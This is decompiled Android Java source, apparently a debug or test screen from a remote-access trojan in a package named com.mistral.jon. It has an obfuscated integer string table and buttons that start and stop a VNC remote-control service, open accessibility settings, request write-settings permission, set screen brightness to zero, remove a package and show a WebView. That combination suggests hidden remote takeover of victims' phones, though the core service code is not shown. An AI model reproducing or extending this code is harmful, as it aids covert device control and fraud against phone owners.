package com.mistral.jon.activity;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import androidx.appcompat.app.AppCompatActivity;
import com.mistral.jon.services.VncService;
import p001z.bbm;

/* JADX INFO: loaded from: classes.dex */
public class TestActivity extends AppCompatActivity {

    /* JADX INFO: renamed from: a */
    private static long[] f726a = {1473195602, 2064635074, 1555268687, 117187596, -700128510, 1535378543, -1351614969, 1951120764, 1548979970, -432758305, 711834667, -1648628372, 890074512, -615772928, 1130907427, 925993754, 1123687296, -1998383283, 788556642, -829617209, 810918118, 504874699, 1845238559, 534130904, -212050141, 57315570, 1299118433, 701543786, -1429854614, 1802182618, -418158689, 530273076, 117688656, 1812511521, -2056629447, 150366044, -415714409, 1189061892, 776184154, -844311048, 140605321, 1778572218, 1521090611, 1961916689, -544470911, 1029898253, 1643863446, 180686944, 837708727, 704505413, -2073526833, 678877328, 719606436, 2062614448, 2074261659, 1304327741, 1767321322, 666985493, 1749171133, 286260463, 1713750341, 2102322345, 347598418, 1775583115, 1296844434, 1016345875, 1758960466, 177460511, 1378797747, 304927438, 426908795, 1503693591, 1072018514, 2017064189, 1081536451, 2099488052, 2006323291, 1212837353, 2010307534, 835509541, 1021425000, 687737720, -412770888, 1347142508, -1737567198, -1910217626, 720954524, -1141945702, -283103650, -936993862, -248086435, -1738818685, 728508766, 17461593, 919386197, 1537641491, 702099694, 845139097, 20858156, 853904250, 2127227602, 1712538469, 843075901, -663829028, -540488663, -79822243, -1128642463, -1158005429, -1764050546, -689431506, -746250502, 1250935267, -1124686364, -47269572, 1380253769, 1670659589, 135196275, 1080493082, 191467291, 1078297874, 1627091124, 1871833350, -2020348807, 287819095, 486285297, -513065278, -2018395543, 1388046116, 986514006, -931731065, -37675472, 995409961, 911482596, 576804216, -151355984, -990006299, -53154991, -177443989, -1212024836, -1849710388, -348287386, 1963652055, 316420082, 995199143, 183316231, 1857163715, -1310200985, 1032154518, -987229840, -2051526073, -1978567298, -146257942, 936813767, 1171789870, 485247106, 1941999884, -1714194092, 1069890474, -908659304, -905017373, -656222308, -359313233, -1179117698, -263701940, -106094882, -1487475178, -1629770105, -11898577, -1679141317, 649831030, -698815028, -531841557, -521059540, 1144133905, -238365380, -1717041047, 1720220279};

    /* JADX INFO: renamed from: a */
    private View m1031a(String str, ViewGroup viewGroup, View.OnClickListener onClickListener) {
        Button button = new Button(this);
        button.setLayoutParams(new ViewGroup.LayoutParams(-1, -2));
        button.setText(str);
        button.setOnClickListener(onClickListener);
        viewGroup.addView(button);
        return button;
    }

    /* JADX INFO: renamed from: a */
    private /* synthetic */ void m1032a(View view) {
        ContentResolver resolver = getContentResolver();
        Settings.System.putInt(resolver, "screen_brightness_mode", 0);
        Settings.System.putInt(resolver, "screen_brightness", 0);
    }

    /* JADX INFO: String decrypt: "package:" */
    /* JADX INFO: renamed from: b */
    private /* synthetic */ void m1033b(View view) {
        if (Settings.System.canWrite(this)) {
            return;
        }
        Intent intent = new Intent("android.settings.action.MANAGE_WRITE_SETTINGS");
        intent.setData(Uri.parse("package:" + getPackageName()));
        startActivity(intent);
    }

    /* JADX INFO: renamed from: c */
    private /* synthetic */ void m1034c(View view) {
        WebViewActivity.m1044a((Context) this);
    }

    /* JADX INFO: renamed from: d */
    private /* synthetic */ void m1035d(View view) {
        bbm.m4483a(this);
    }

    /* JADX INFO: renamed from: e */
    private /* synthetic */ void m1036e(View view) {
        VncService.m1096b(this);
    }

    /* JADX INFO: String decrypt: "Accessibility settings"; "Start VNC"; "Stop VNC"; "Remove package"; "Show WebView"; "Request Write Settings"; "Change brightness" */
    /* JADX INFO: renamed from: f */
    private void m1037f() {
        RelativeLayout.LayoutParams layoutParams = new RelativeLayout.LayoutParams(-1, -1);
        LinearLayout layout = new LinearLayout(this);
        layout.setLayoutParams(layoutParams);
        layout.setOrientation(1);
        m1031a("Accessibility settings", layout, new View.OnClickListener() { // from class: com.mistral.jon.activity.-$$Lambda$TestActivity$XZzpi8LThu0GAG_WSm2FC2w7rgc
            public /* synthetic */ $$Lambda$TestActivity$XZzpi8LThu0GAG_WSm2FC2w7rgc() {
            }

            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                TestActivity.lambda$XZzpi8LThu0GAG_WSm2FC2w7rgc(this.f$0, view);
            }
        });
        m1031a("Start VNC", layout, new View.OnClickListener() { // from class: com.mistral.jon.activity.-$$Lambda$TestActivity$Fdja6poRQ2c5aNZBFQrpltTJjdM
            public /* synthetic */ $$Lambda$TestActivity$Fdja6poRQ2c5aNZBFQrpltTJjdM() {
            }

            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                TestActivity.lambda$Fdja6poRQ2c5aNZBFQrpltTJjdM(this.f$0, view);
            }
        });
        m1031a("Stop VNC", layout, new View.OnClickListener() { // from class: com.mistral.jon.activity.-$$Lambda$TestActivity$L4Iv4p5KjSjtSRGOes1HLhJHuRg
            public /* synthetic */ $$Lambda$TestActivity$L4Iv4p5KjSjtSRGOes1HLhJHuRg() {
            }

            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                TestActivity.lambda$L4Iv4p5KjSjtSRGOes1HLhJHuRg(this.f$0, view);
            }
        });
        m1031a("Remove package", layout, new View.OnClickListener() { // from class: com.mistral.jon.activity.-$$Lambda$TestActivity$3QD864f9mmlSMopw7WrsYQByVDA
            public /* synthetic */ $$Lambda$TestActivity$3QD864f9mmlSMopw7WrsYQByVDA() {
            }

            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                TestActivity.lambda$3QD864f9mmlSMopw7WrsYQByVDA(this.f$0, view);
            }
        });
        m1031a("Show WebView", layout, new View.OnClickListener() { // from class: com.mistral.jon.activity.-$$Lambda$TestActivity$NjHVqspaRu-e98ywhxy32K75go4
            public /* synthetic */ $$Lambda$TestActivity$NjHVqspaRue98ywhxy32K75go4() {
            }

            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                TestActivity.m10587lambda$NjHVqspaRue98ywhxy32K75go4(this.f$0, view);
            }
        });
        m1031a("Request Write Settings", layout, new View.OnClickListener() { // from class: com.mistral.jon.activity.-$$Lambda$TestActivity$IbaGLQCuCxAjK9-bwuu6d9qW9PM
            public /* synthetic */ $$Lambda$TestActivity$IbaGLQCuCxAjK9bwuu6d9qW9PM() {
            }

            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                TestActivity.m10586lambda$IbaGLQCuCxAjK9bwuu6d9qW9PM(this.f$0, view);
            }
        });
        m1031a("Change brightness", layout, new View.OnClickListener() { // from class: com.mistral.jon.activity.-$$Lambda$TestActivity$NdfnN1RVSdpNLcX7aRor48MDfI0
            public /* synthetic */ $$Lambda$TestActivity$NdfnN1RVSdpNLcX7aRor48MDfI0() {
            }

            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                TestActivity.lambda$NdfnN1RVSdpNLcX7aRor48MDfI0(this.f$0, view);
            }
        });
        setContentView(layout);
    }

    /* JADX INFO: renamed from: f */
    private /* synthetic */ void m1038f(View view) {
        VncService.m1092a(this);
    }

    /* JADX INFO: renamed from: g */
    private /* synthetic */ void m1039g(View view) {
        startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
    }

    public static /* synthetic */ void lambda$3QD864f9mmlSMopw7WrsYQByVDA(TestActivity testActivity, View view) {
        testActivity.m1035d(view);
    }

    public static /* synthetic */ void lambda$Fdja6poRQ2c5aNZBFQrpltTJjdM(TestActivity testActivity, View view) {
        testActivity.m1038f(view);
    }

    /* JADX INFO: renamed from: lambda$IbaGLQCuCxAjK9-bwuu6d9qW9PM */
    public static /* synthetic */ void m10586lambda$IbaGLQCuCxAjK9bwuu6d9qW9PM(TestActivity testActivity, View view) {
        testActivity.m1033b(view);
    }

    public static /* synthetic */ void lambda$L4Iv4p5KjSjtSRGOes1HLhJHuRg(TestActivity testActivity, View view) {
        testActivity.m1036e(view);
    }

    public static /* synthetic */ void lambda$NdfnN1RVSdpNLcX7aRor48MDfI0(TestActivity testActivity, View view) {
        testActivity.m1032a(view);
    }

    /* JADX INFO: renamed from: lambda$NjHVqspaRu-e98ywhxy32K75go4 */
    public static /* synthetic */ void m10587lambda$NjHVqspaRue98ywhxy32K75go4(TestActivity testActivity, View view) {
        testActivity.m1034c(view);
    }

    public static /* synthetic */ void lambda$XZzpi8LThu0GAG_WSm2FC2w7rgc(TestActivity testActivity, View view) {
        testActivity.m1039g(view);
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        m1037f();
    }
}
